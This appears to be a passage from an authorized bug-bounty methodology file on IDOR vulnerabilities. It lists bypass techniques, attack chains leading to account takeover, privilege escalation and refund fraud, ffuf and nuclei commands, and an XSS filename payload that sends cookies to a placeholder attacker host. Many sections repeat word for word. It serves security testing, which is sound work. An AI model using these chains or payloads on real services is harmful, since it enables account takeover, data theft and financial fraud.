# Try undocumented methods
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  echo "=== $method ==="
  curl -s -X $method \
    -H "Authorization: Bearer USER_B_TOKEN" \
    https://target.com/api/v1/users/USER_A_ID/profile
done
```

---

### Bypass Techniques

**Defense: UUIDs instead of sequential integers**
- Bypass: UUIDs often leak in other API responses, notification emails, webhooks, GraphQL queries, or JS source
- Technique: Harvest UUIDs from accessible endpoints, then replay against restricted ones

**Defense: Indirect/hashed object references**
- Bypass: Decode the hash (often base64 or simple obfuscation), or find the original ID in another response
- Technique: `echo "dXNlcl8xMjM0NQ==" | base64 -d` → `user_12345`

**Defense: Short-lived tokens per resource**
- Bypass: Tokens sometimes reusable across users if server only validates token format, not binding
- Technique: Use your own token to access another user's resource ID

**Defense: Rate limiting on enumeration**
- Bypass: Slow enumeration (1 req/5s), use distributed IPs, or exploit non-enumeration IDORs (you already know the target's ID from another leak)

**Defense: Checking `user_id` in WHERE clause**
- Bypass: Check if the same endpoint exists at a different API version (`/v1/` vs `/v2/`) — authorization logic is often version-specific
- Technique: Check JS bundles for older API version calls

**Defense: CORS restrictions**
- Bypass: IDOR doesn't require cross-origin exploitation — you're testing API endpoints directly with your own session

**Defense: "Opaque" references via server-side sessions**
- Bypass: Look for any endpoint that *returns* the internal ID, then use it elsewhere; APIs often expose IDs in `Location` headers, error messages, or metadata

**Defense: Parameter filtering/WAF on common patterns**
- Bypass: Try nested JSON `{"data": {"id": "VICTIM_ID"}}`, HTTP parameter pollution `?id=own_id&id=victim_id`, or parameter name variations `user_id`, `userId`, `uid`, `account`

---

### Operator-level pattern

When you confirm a read-IDOR at A, immediately ask: *what state-change accepts the same ID and might also be IDOR'd?* The chain is usually one of: (1) password reset / email change at terminal step → ATO; (2) refund / withdraw / transfer → financial; (3) role-change / membership-add → privilege escalation. If your read-IDOR doesn't compose to one of those, the standalone payout is what you get. Hunt for both halves — the second is often easier to find because it shares the same auth bug class as the first.

Cross-references:
- `hunt-ato` — Chain 1, 5
- `hunt-xss` — Chain 2
- `hunt-graphql` — Chains 3, 4
- `hunt-misc` — Chain 5
- `hunt-business-logic` — Chain 6

---

## Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

### Gate 0 Validation

Before writing the report, answer all three:

1. **What can the attacker DO right now?**
   Be specific: "Attacker with a valid account can send a GET request to `/api/v1/invoices/{victim_invoice_id}` and receive the victim's full billing document including name, address, and payment amount — without any relationship to that account."

2. **What does the victim LOSE?**
   Map to CIA triad: confidentiality (data exposed), integrity (data modified), or availability (data deleted). "Victim loses confidentiality of private financial records" or "Victim's content is deleted by a third party" — vague answers fail.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Two fresh accounts created ✓
   - Exact HTTP request documented with victim's ID ✓
   - 200 OK response showing victim's data (or confirmed state change) ✓
   - No reliance on pre-existing state or timing ✓
   
   If you can't demo it reproducibly, do not file the report.

---

### C. Validation / proof bar — how to confirm the bug and avoid false positives

- **Role matrix evidence:** for each object type × action (read, create, update, delete, export, share, approve), record expected allow/deny, then replay every deny cell across A, B, C, and no session. A finding is a deny cell that returns data or changes state.
- **Body-diff the 200:** the #1 N/A driver is "returns 200 but no data" (empty array, redacted fields, "access denied" in body). Confirm the response actually contains the other user's data or a real state change — not merely a success status.
- **Ownership ground truth:** state the account used, the object owner, the exact request/response pair, and the expected matrix cell. Create the victim object yourself in the test account so there is no ambiguity about who owns it.
- **Deny-by-default check:** a correct fix returns 403 **or** 404; 404 is preferable when existence is sensitive (OWASP Spring example maps both missing and unauthorized to 404). If the "fixed" endpoint returns 200 with a different body, retest.
- **Negative controls:** show the same request with B's session on B's own object works (proves the session is valid) and with A's session on B's object is denied (proves the check exists elsewhere). This rules out a global "endpoint is broken" explanation.
- **Stay safe:** use only your own test accounts/data, stop at proof, do not enumerate real users. Scanners cannot prove this class — the exploiting request looks perfectly valid — so manual multi-account evidence is the bar (OWASP/AA23-208A).
- **Normalize before the check:** if a bypass works with `%2e`, double-encoding, trailing dots, or case variants of the ID, the authorization layer and data layer are normalizing differently — record the exact canonical form that slips through.
- **Severity follows the object, not the label:** OWASP rates BOLA exploitability Easy / prevalence Widespread. Read of a display name is Low; read of financial records, email change → ATO, deletion, or an IDOR that reaches RCE (Telerik) is High–Critical. Map to the Bugcrowd-style P1–P4 impact ladder before scoring.
- **Reproducibility:** two fresh accounts, exact request with victim ID, and a second tester reproducing in <10 minutes; turn the confirmed case into an automated two-user regression test.

### Part 12 — Reporting bar

- Prove real impact on a second controlled account (or a safe callback where applicable).
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Show the differential — victim's data returned under attacker session, or confirmed state change.
- Never report a 200-with-no-data IDOR — body-diff against a legitimate own-object response first.
- Attribute the sink — if several parameters/endpoints could be the cause, isolate one per request so the client patches the right field.
- Stay inside program scope and follow disclosure rules.

---

## Escalation and related chains

### Escalation chains

- IDOR read -> PII exposure.
- IDOR write -> account takeover.
- IDOR + mass assignment -> privilege escalation.

### Chains & Compositions (Senior Hunting)

Standalone IDOR gets paid at Low-Medium for cross-tenant *read*. The real money is in chaining IDOR to a *state-change* primitive that doesn't normally permit cross-tenant action — turning "I can see victim's data" into "I own victim's account". The six chains below are the highest-paying IDOR compositions on modern bug-bounty programs.

### Chain 1 — IDOR on `/api/users/{id}/email` + Missing Re-Auth → Password Reset → ATO

- **A.** Confirm IDOR on the email-change endpoint — request `PUT /api/users/{victim_id}/email {"email":"attacker@evil"}` from attacker's session; server changes the victim's email without ownership check.
- **B.** Hit the password-reset flow on the victim's account — server emails reset link to the **new** email (attacker's).
- **C.** Open reset link, set new password, log in as victim.
- **Impact:** Silent ATO — victim sees no email change notification because the change happens via API not via the user-facing "change email" UI which has its own audit log.
- **Real shape:** Classic ATO pattern across many SaaS bug-bounty disclosures 2018-2024. Cross-refs `account-takeover` Path 2 (email change without re-auth).

### Chain 2 — IDOR on File-Download + Filename-Controlled `Content-Disposition` → Reflected-XSS-Via-Download → Session Theft

- **A.** IDOR on `/api/files/{id}/download` returns any user's file given the ID.
- **B.** The download endpoint sets `Content-Disposition: attachment; filename="<user-supplied-filename>"` without sanitising newlines or quotes — attacker uploads a file with filename `"; <script>fetch('https://attacker/x?c='+document.cookie)</script>; foo.txt`.
- **C.** Victim navigates to download → browser interprets the injected script in the response header context as HTML → JS runs same-origin → cookie/token exfil.
- **Impact:** ATO via IDOR + filename-controlled response header — neither primitive alone is critical; the chain is.
- **Real shape:** Multiple disclosed cases involving Office 365 SharePoint download endpoints, GitLab attachment downloads, SaaS export endpoints. Pairs with `xss` Chain 1 (response-header XSS class).

### Chain 3 — IDOR via GraphQL `node(id:)` GID + Relay Relation Traversal → Cross-Tenant Mass Data Extraction

- **A.** Target uses GraphQL with Relay-style global IDs (`gid://shopify/Customer/<n>` or base64-encoded `type:id` patterns).
- **B.** `node(id:"<victim_gid>") { ... on Customer { email orders { totalPrice paymentMethods { cardLast4 } } } }` — the top-level `node()` resolver auths the requester, but nested relations don't re-check ownership against the resolved Customer.
- **C.** Iterate IDs (decoding base64 to extract numeric, incrementing) to exfil emails, order totals, payment methods across the entire customer base.
- **Impact:** Mass cross-tenant PII / financial data extraction. Single bug, full database.
- **Real shape:** Shopify Billing IDOR H1 #2207248 ($5,000); HackerOne PolicyPageAssetGroup IDOR H1 #1618347 ($25,000). Cross-refs `graphql` Disclosed Report Citation #5 and #2.

### Chain 4 — IDOR on `/api/teams/{id}/members` + Mass-Assignment in Body → Role Escalation on Victim Team

- **A.** Standard horizontal IDOR — `POST /api/teams/{victim_team_id}/members {"email":"attacker@evil"}` adds attacker as a normal member without ownership check.
- **B.** The body accepts additional fields the API didn't filter: `{"email":"attacker@evil", "role":"OWNER", "permissions":["*"]}` — mass assignment leaks into the role field.
- **C.** Attacker is added to the victim team as OWNER. Now has full admin access to the victim team's resources and can remove the real owners.
- **Impact:** Cross-tenant privilege escalation via IDOR + mass assignment. The single most efficient takeover chain on SaaS team-management APIs.
- **Real shape:** Shopify undocumented `fileCopy` mutation H1 #981472 (2020, $2,000); Stripe `UpdateAtlasApplicationPerson` cross-tenant mutation H1 #1066203 (2020). Cross-refs `graphql` Disclosed Report Citation #7 and #8; pairs with `api-misconfig` Mass Assignment section.

### Chain 5 — Soft-Delete IDOR + Post-Removal Token Validity → Persistent Cross-Tenant Access

- **A.** Identify the "remove member" endpoint that flips an `active=false` flag but doesn't invalidate the session/PAT.
- **B.** Log in as the to-be-removed user; capture session cookie or PAT.
- **C.** Have the org admin remove the user via the normal flow. Wait. Re-issue API calls using the captured token — IDOR is now *temporal* (the user no longer has permission per the policy table, but the cached auth context still passes).
- **Impact:** Weeks of post-termination cross-tenant access; GDPR/CCPA breach exposure; potential extortion leverage.
- **Real shape:** Shopify removed-staff persistence class (2022). Cross-refs `misc` Chain 1 — same root cause shape, different starting primitive.

### Chain 6 — Double-IDOR (`/users/{id}/orders → /orders/{order_id}/refund`) → Financial Impact on Victim Merchant

- **A.** First IDOR: `GET /api/users/{victim_id}/orders` returns the victim's order list without ownership check — yields legitimate `order_id` values.
- **B.** Second IDOR: `POST /api/orders/{order_id}/refund` issues refunds without checking that the requester owns the merchant/order.
- **C.** Trigger refund on each of the victim merchant's recent orders. Money moves from merchant to customer (who is also attacker-controlled).
- **Impact:** Direct financial loss to the victim merchant. Mass-exploitable across the platform's merchant base.
- **Real shape:** Multiple disclosed e-commerce platform IDOR chains 2019-2023. Cross-refs `logic-and-design` Chain (financial impact via state-machine confusion).

### Related Skills & Chains

- **`auth-bypass`** — Object-level authorization failure plus route-level auth absence is the canonical IDOR-amplifier. Chain primitive: missing `req.user.id` scoping in ORM query + missing middleware on legacy `/v1/` route = unauthenticated cross-tenant data read via direct ID substitution → bulk PII dump without any session at all.
- **`account-takeover`** — Profile-edit IDOR is the most direct path from "read someone's data" to "own their account." Chain primitive: `PATCH /api/users/{victim_uid}` accepts attacker's session + victim UID → set `email=attacker@evil.com` → trigger password reset → reset link arrives at attacker → full ATO without ever knowing victim credentials.
- **`graphql`** — GraphQL resolvers without field-level authorization are IDOR-by-default; introspection hands you the schema. Chain primitive: `__schema` introspection → enumerate every mutation accepting `id:` argument → substitute victim IDs across `updateUser`, `deleteOrg`, `transferBilling` mutations → mass IDOR fan-out from one introspection query.
- **`security-arsenal`** — Pull the IDOR Bypass Tables section for HTTP-parameter-pollution payloads (`?id=own&id=victim`), nested-JSON wrappers (`{"data":{"id":"VICTIM"}}`), and parameter-name variations (`uid`/`userId`/`user_id`/`account`) when the first direct substitution returns 403.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an IDOR that returns 200 but doesn't actually leak data (empty array, redacted fields, "access denied" in body with 200 status). The 200-but-no-data IDOR is the #1 N/A driver on H1/Bugcrowd.

### Part 6 — Escalation chains (senior hunting)

Standalone IDOR gets paid Low–Medium for cross-tenant read. The real money is chaining IDOR to a state-change primitive that doesn't normally permit cross-tenant action — turning "I can see victim's data" into "I own victim's account." The six chains below are among the highest-paying IDOR compositions on modern bug-bounty programs.

**Chain 1 — IDOR on `/api/users/{id}/email` + missing re-auth → password reset → ATO**
A. `PUT /api/users/{victim_id}/email {"email":"attacker@evil"}` from attacker's session — server changes the victim's email without ownership check.
B. Hit the password-reset flow — server emails the reset link to the new (attacker's) email.
C. Open the reset link, set a new password, log in as victim.
Impact: Silent ATO — victim sees no email-change notification because the change happens via API, not via the user-facing UI that has its own audit log.

**Chain 2 — IDOR on file-download + filename-controlled Content-Disposition → reflected XSS via download → session theft**
A. IDOR on `/api/files/{id}/download` returns any user's file given the ID.
B. The download endpoint sets `Content-Disposition: attachment; filename="<user-supplied-filename>"` without sanitising newlines or quotes — attacker uploads a file named `"; <script>fetch('https://attacker/x?c='+document.cookie)</script>; foo.txt`.
C. Victim navigates to download → browser interprets the injected script in the response-header context as HTML → JS runs same-origin → cookie/token exfil.
Impact: ATO via IDOR + filename-controlled response header — neither primitive alone is critical; the chain is.

**Chain 3 — IDOR via GraphQL `node(id:)` GID + Relay relation traversal → cross-tenant mass data extraction**
A. Target uses Relay-style global IDs (`gid://shopify/Customer/<n>` or `base64(type:id)`).
B. `node(id:"<victim_gid>") { ... on Customer { email orders { totalPrice paymentMethods { cardLast4 } } } }` — the top-level resolver auths the requester, nested relations don't re-check ownership.
C. Iterate IDs (decode base64 → numeric → increment) to exfil emails, order totals, payment methods across the customer base.
Impact: Mass cross-tenant PII / financial data extraction. Single bug, full database.

**Chain 4 — IDOR on `/api/teams/{id}/members` + mass assignment in body → role escalation on victim team**
A. `POST /api/teams/{victim_team_id}/members {"email":"attacker@evil"}` adds attacker as a normal member without ownership check.
B. The body accepts additional unfiltered fields: `{"email":"attacker@evil", "role":"OWNER", "permissions":["*"]}`.
C. Attacker is added as OWNER — full admin access to the victim team's resources, can remove real owners.
Impact: Cross-tenant privilege escalation via IDOR + mass assignment.

**Chain 5 — Soft-delete IDOR + post-removal token validity → persistent cross-tenant access**
A. Identify the "remove member" endpoint that flips `active=false` but doesn't invalidate the session/PAT.
B. Log in as the to-be-removed user; capture session cookie or PAT.
C. Have the org admin remove the user via the normal flow. Wait. Re-issue API calls using the captured token — IDOR is now temporal (the user no longer has permission per the policy table, but the cached auth context still passes).
Impact: Weeks of post-termination cross-tenant access; GDPR/CCPA breach exposure; potential extortion leverage.

**Chain 6 — Double IDOR (`/users/{id}/orders` → `/orders/{order_id}/refund`) → financial impact on victim merchant**
A. First IDOR: `GET /api/users/{victim_id}/orders` returns the victim's order list without ownership check — yields legitimate `order_id` values.
B. Second IDOR: `POST /api/orders/{order_id}/refund` issues refunds without checking that the requester owns the merchant/order.
C. Trigger refund on each of the victim merchant's recent orders. Money moves from merchant to customer (attacker-controlled).
Impact: Direct financial loss to the victim merchant. Mass-exploitable across the platform's merchant base.

**Operator-level pattern:** When you confirm a read-IDOR at A, immediately ask: what state-change accepts the same ID and might also be IDOR'd? The chain is usually one of: (1) password reset / email change at the terminal step → ATO; (2) refund / withdraw / transfer → financial; (3) role-change / membership-add → privilege escalation. If your read-IDOR doesn't compose to one of those, the standalone payout is what you get. Hunt for both halves — the second is often easier to find because it shares the same auth bug class as the first.

Cross-references: hunt-ato (Chains 1, 5), hunt-xss (Chain 2), hunt-graphql (Chains 3, 4), hunt-misc (Chain 5), hunt-business-logic (Chain 6).

---

### Related skills & chains

- **hunt-auth-bypass** — object-level authz failure + route-level auth absence is the canonical IDOR amplifier. Chain: missing `req.user.id` scoping in ORM query + missing middleware on legacy `/v1/` route = unauthenticated cross-tenant data read via direct ID substitution → bulk PII dump without any session.
- **hunt-ato** — profile-edit IDOR is the most direct path from "read someone's data" to "own their account." Chain: `PATCH /api/users/{victim_uid}` accepts attacker's session + victim UID → set `email=attacker@evil.com` → trigger password reset → reset link arrives at attacker → full ATO.
- **hunt-graphql** — GraphQL resolvers without field-level authz are IDOR-by-default; introspection hands you the schema. Chain: `__schema` introspection → enumerate every mutation accepting `id:` → substitute victim IDs across `updateUser`, `deleteOrg`, `transferBilling` → mass IDOR fan-out from one introspection query.
- **hunt-ssrf** — SSRF often chains to internal object stores and signed-URL services; a leaked internal ID from an SSRF response can feed an IDOR on an internal API.
- **security-arsenal** — pull the IDOR Bypass Tables section for HPP (`?id=own&id=victim`), nested-JSON wrappers (`{"data":{"id":"VICTIM"}}`), and parameter-name variations (`uid`/`userId`/`user_id`/`account`) when direct substitution returns 403.
- **triage-validation** — run the Pre-Severity Gate before claiming Critical on an IDOR that returns 200 but doesn't leak data (empty array, redacted fields, "access denied" in body with 200). The 200-but-no-data IDOR is the #1 N/A driver on H1/Bugcrowd.
- **hunt-business-logic** — Chain 6 (double-IDOR refund) is a business-logic composition; state-machine confusion and price manipulation often ride on the same missing object-level check.
- **hunt-xss** — Chain 2 (filename-controlled Content-Disposition) is a response-header XSS class; pair with the XSS skill when a download endpoint sets user-controlled headers.

### Chain 1 — IDOR on `/api/users/{id}/email` + Missing Re-Auth → Password Reset → ATO

- **A.** Confirm IDOR on the email-change endpoint — request `PUT /api/users/{victim_id}/email {"email":"attacker@evil"}` from attacker's session; server changes the victim's email without ownership check.
- **B.** Hit the password-reset flow on the victim's account — server emails reset link to the **new** email (attacker's).
- **C.** Open reset link, set new password, log in as victim.
- **Impact:** Silent ATO — victim sees no email change notification because the change happens via API not via the user-facing "change email" UI which has its own audit log.
- **Real shape:** Classic ATO pattern across many SaaS bug-bounty disclosures 2018-2024. Cross-refs `hunt-ato` Path 2 (email change without re-auth).

### Chain 2 — IDOR on File-Download + Filename-Controlled `Content-Disposition` → Reflected-XSS-Via-Download → Session Theft

- **A.** IDOR on `/api/files/{id}/download` returns any user's file given the ID.
- **B.** The download endpoint sets `Content-Disposition: attachment; filename="<user-supplied-filename>"` without sanitising newlines or quotes — attacker uploads a file with filename `"; <script>fetch('https://attacker/x?c='+document.cookie)</script>; foo.txt`.
- **C.** Victim navigates to download → browser interprets the injected script in the response header context as HTML → JS runs same-origin → cookie/token exfil.
- **Impact:** ATO via IDOR + filename-controlled response header — neither primitive alone is critical; the chain is.
- **Real shape:** Multiple disclosed cases involving Office 365 SharePoint download endpoints, GitLab attachment downloads, SaaS export endpoints. Pairs with `hunt-xss` Chain 1 (response-header XSS class).

### Chain 3 — IDOR via GraphQL `node(id:)` GID + Relay Relation Traversal → Cross-Tenant Mass Data Extraction

- **A.** Target uses GraphQL with Relay-style global IDs (`gid://shopify/Customer/<n>` or base64-encoded `type:id` patterns).
- **B.** `node(id:"<victim_gid>") { ... on Customer { email orders { totalPrice paymentMethods { cardLast4 } } } }` — the top-level `node()` resolver auths the requester, but nested relations don't re-check ownership against the resolved Customer.
- **C.** Iterate IDs (decoding base64 to extract numeric, incrementing) to exfil emails, order totals, payment methods across the entire customer base.
- **Impact:** Mass cross-tenant PII / financial data extraction. Single bug, full database.
- **Real shape:** Shopify Billing IDOR H1 #2207248 ($5,000); HackerOne PolicyPageAssetGroup IDOR H1 #1618347 ($25,000). Cross-refs `hunt-graphql` Disclosed Report Citation #5 and #2.

### Chain 4 — IDOR on `/api/teams/{id}/members` + Mass-Assignment in Body → Role Escalation on Victim Team

- **A.** Standard horizontal IDOR — `POST /api/teams/{victim_team_id}/members {"email":"attacker@evil"}` adds attacker as a normal member without ownership check.
- **B.** The body accepts additional fields the API didn't filter: `{"email":"attacker@evil", "role":"OWNER", "permissions":["*"]}` — mass assignment leaks into the role field.
- **C.** Attacker is added to the victim team as OWNER. Now has full admin access to the victim team's resources and can remove the real owners.
- **Impact:** Cross-tenant privilege escalation via IDOR + mass assignment. The single most efficient takeover chain on SaaS team-management APIs.
- **Real shape:** Shopify undocumented `fileCopy` mutation H1 #981472 (2020, $2,000); Stripe `UpdateAtlasApplicationPerson` cross-tenant mutation H1 #1066203 (2020). Cross-refs `hunt-graphql` Disclosed Report Citation #7 and #8; pairs with `hunt-api-misconfig` Mass Assignment section.

### Chain 5 — Soft-Delete IDOR + Post-Removal Token Validity → Persistent Cross-Tenant Access

- **A.** Identify the "remove member" endpoint that flips an `active=false` flag but doesn't invalidate the session/PAT.
- **B.** Log in as the to-be-removed user; capture session cookie or PAT.
- **C.** Have the org admin remove the user via the normal flow. Wait. Re-issue API calls using the captured token — IDOR is now *temporal* (the user no longer has permission per the policy table, but the cached auth context still passes).
- **Impact:** Weeks of post-termination cross-tenant access; GDPR/CCPA breach exposure; potential extortion leverage.
- **Real shape:** Shopify removed-staff persistence class (2022). Cross-refs `hunt-misc` Chain 1 — same root cause shape, different starting primitive.

### Chain 6 — Double-IDOR (`/users/{id}/orders → /orders/{order_id}/refund`) → Financial Impact on Victim Merchant

- **A.** First IDOR: `GET /api/users/{victim_id}/orders` returns the victim's order list without ownership check — yields legitimate `order_id` values.
- **B.** Second IDOR: `POST /api/orders/{order_id}/refund` issues refunds without checking that the requester owns the merchant/order.
- **C.** Trigger refund on each of the victim merchant's recent orders. Money moves from merchant to customer (who is also attacker-controlled).
- **Impact:** Direct financial loss to the victim merchant. Mass-exploitable across the platform's merchant base.
- **Real shape:** Multiple disclosed e-commerce platform IDOR chains 2019-2023. Cross-refs `hunt-business-logic` Chain (financial impact via state-machine confusion).

### Related Skills & Chains

- **`hunt-auth-bypass`** — Object-level authorization failure plus route-level auth absence is the canonical IDOR-amplifier. Chain primitive: missing `req.user.id` scoping in ORM query + missing middleware on legacy `/v1/` route = unauthenticated cross-tenant data read via direct ID substitution → bulk PII dump without any session at all.
- **`hunt-ato`** — Profile-edit IDOR is the most direct path from "read someone's data" to "own their account." Chain primitive: `PATCH /api/users/{victim_uid}` accepts attacker's session + victim UID → set `email=attacker@evil.com` → trigger password reset → reset link arrives at attacker → full ATO without ever knowing victim credentials.
- **`hunt-graphql`** — GraphQL resolvers without field-level authorization are IDOR-by-default; introspection hands you the schema. Chain primitive: `__schema` introspection → enumerate every mutation accepting `id:` argument → substitute victim IDs across `updateUser`, `deleteOrg`, `transferBilling` mutations → mass IDOR fan-out from one introspection query.
- **`security-arsenal`** — Pull the IDOR Bypass Tables section for HTTP-parameter-pollution payloads (`?id=own&id=victim`), nested-JSON wrappers (`{"data":{"id":"VICTIM"}}`), and parameter-name variations (`uid`/`userId`/`user_id`/`account`) when the first direct substitution returns 403.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an IDOR that returns 200 but doesn't actually leak data (empty array, redacted fields, "access denied" in body with 200 status). The 200-but-no-data IDOR is the #1 N/A driver on H1/Bugcrowd.

## Tools and wordlists

### Tools

`Autorize` · `Burp Repeater` · `ffuf` · `mitmproxy` · `Postman`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_idor.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_idor.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_idor.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_idor.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

### Nuclei

Nuclei only finds exposed objects; the real work is cross-account replay with two identities.

```sh
nuclei -u https://target -tags idor,exposure \
       -severity low,medium,high,critical -rl 40 -o nuclei_idor.txt
nuclei -u https://target -t ~/nuclei-templates/http/exposures \
       -rl 40 -o nuclei_idor_exposures.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### 2.9 Source-code grep patterns

```bash
# Missing authorization checks in common frameworks
grep -r "findById\|findOne\|getById" --include="*.js" .
grep -r "params\[:id\]\|params\['id'\]" --include="*.rb" .
grep -r "request\.args\.get\('id'\)" --include="*.py" .

# Direct ORM queries without user scoping
grep -r "Model\.find(params" --include="*.js" .
# secure pattern:  Model.find({ id: params.id, userId: req.user.id })
```

### 9.1 Tools

Autorize (Burp ext — auto-replays with a second user's session) · AuthMatrix (multi-role testing) · AuthAnalyzer (token swapping) · Burp Repeater · ffuf · mitmproxy · Postman · graphw00f · clairvoyance · inql · graphql-cop · GraphQLmap

### 9.2 Wordlists

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_idor.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_idor.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_idor.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_idor.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

### 9.3 Nuclei

Nuclei only finds exposed objects; the real work is cross-account replay with two identities.

```sh
nuclei -u https://target -tags idor,exposure \
       -severity low,medium,high,critical -rl 40 -o nuclei_idor.txt
nuclei -u https://target -t ~/nuclei-templates/http/exposures \
       -rl 40 -o nuclei_idor_exposures.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

## Real-world examples

### Real Impact Examples

**Scenario 1: Financial Data Exposure + Cross-Account Billing Fraud (Uber-style)**
An attacker discovers two related IDORs: one allows reading any organization's voucher policy configuration (exposing org IDs, employee email lists, and payment methods), and a second allows modifying voucher policies using those leaked IDs. Chained together, this enables the attacker to redirect charges to an arbitrary business account, expose employee PII across organizations, and take over invitation links — all without any elevated privileges beyond a basic user account. Impact: financial fraud + mass PII exposure across the B2B platform.

**Scenario 2: Private Repository Read via IDOR on Migration Endpoint (GitHub-style)**
A migration feature allows users to upload files to a migration job. The `migration_id` parameter is not validated against the authenticated user's ownership. An attacker creates their own migration, observes the ID format, and substitutes another user's private migration ID — gaining read access to source code files from private repositories they have no access to. Impact: complete confidentiality bypass for private intellectual property.

**Scenario 3: Account Takeover Chain via Message IDOR (Reddit-style)**
An attacker accesses another user's private message threads by substituting their `thread_id` in a messaging API endpoint. The response includes message content, metadata, and — critically — session or verification tokens sent via internal messages. The attacker leverages the token found in the messages to perform account recovery steps, escalating a read-only IDOR into full account takeover. Impact: complete account compromise of targeted users at scale.

---

### 7.2 Detailed case studies

- **Delete anyone's content spotlight remotely** — #1819832 · Snapchat · $15,000 · high · 2023-03-06 · ▲801. Log in to `my.snapchat.com/myposts`, intercept the delete request, swap the ID.
- **IDOR to add secondary users** — #415081 · PayPal · $10,500 · high · 2019-07-30 · ▲797. PayPal Business accounts allow owners to create secondary users; the endpoint let an owner assign secondary users from other accounts, granting unauthorized access.
- **IDOR - Delete all Licenses and certifications via CreateOrUpdateHackerCertification GraphQL query** — #2122671 · HackerOne · $0 · high · 2023-08-29 · ▲395. Changing the ID in the mutation deletes other users' certifications; iterating IDs deletes an entire range.
- **IDOR allows user to access report details via reference.json endpoint** — #3862641 · HackerOne · $15,000 · critical · 2026-10-01 · ▲372. A VDP account could `POST {}` to `/reports/{id}/reference.json`; despite an HTTP 422 access-denied body, the error response leaked additional report details in `context.subject` — a textbook half-blind IDOR.

### 7.3 Real impact examples (scenario form)

- **Scenario 1 — Financial data exposure + cross-account billing fraud (Uber-style).** One IDOR reads any organization's voucher policy (org IDs, employee emails, payment methods); a second modifies voucher policies using those leaked IDs — chained, this redirects charges to an arbitrary business account and exposes employee PII across organizations.
- **Scenario 2 — Private repository read via IDOR on migration endpoint (GitHub-style).** A migration feature's `migration_id` isn't validated against the authenticated user's ownership; substituting another user's migration ID grants read access to private source code.
- **Scenario 3 — Account takeover chain via message IDOR (Reddit-style).** Substituting `thread_id` exposes another user's private messages, which include a session/verification token sent internally; the attacker uses it for account recovery, escalating a read-only IDOR into full ATO.

## Sources and related reading

### Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class idor --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class idor
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class idor
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class idor --min-bounty 1000
```

### Related

- `hackerone-authz-bypass` (1,386 reports)
- `hackerone-info-disclosure` (1,827 reports)
- `hackerone-graphql` (79 reports)

### Related

- `authz-bypass` (1,386 reports)
- `info-disclosure` (1,827 reports)
- `graphql` (79 reports)

### D. Sources — numbered list of the actual URLs you fetched

1. https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/
2. https://deepstrike.io/blog/what-is-idor
3. https://www.bugcrowd.com/blog/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/
4. https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html

### 1.3 JavaScript source patterns

```javascript
fetch(`/api/v1/users/${userId}/profile`)
axios.get('/invoices/' + invoiceId)
graphql query { billingDocument(id: $docId) }
// Redux/state stores exposing foreign IDs
state.currentUser.organizationId
```

### 3.10 Indirect reference via related objects

Object A (accessible) contains a reference to Object B (should be private). The developer protects direct access to B but not the indirect reference through A. Harvest IDs from notification emails, webhook payloads, metadata, GraphQL introspection, and export files, then replay against the restricted endpoint.

### 9.4 Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class idor --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class idor
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class idor
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class idor --min-bounty 1000
```

---

## Additional notes

### Parameters observed

`id` · `type` · `action` · `message` · `userId` · `Password` · `aura.context` · `aura.pageURI` · `aura.token` · `file` · `domain` · `PID` · `RNo` · `time_range` · `accounts` · `passChange` · `__RequestVerificationToken` · `ConfirmPassword` · `export_columns` · `start`

### Delete anyone's content spotlight remotely.

`#1819832` · Snapchat · $15,000 · high · 2023-03-06 · ▲801
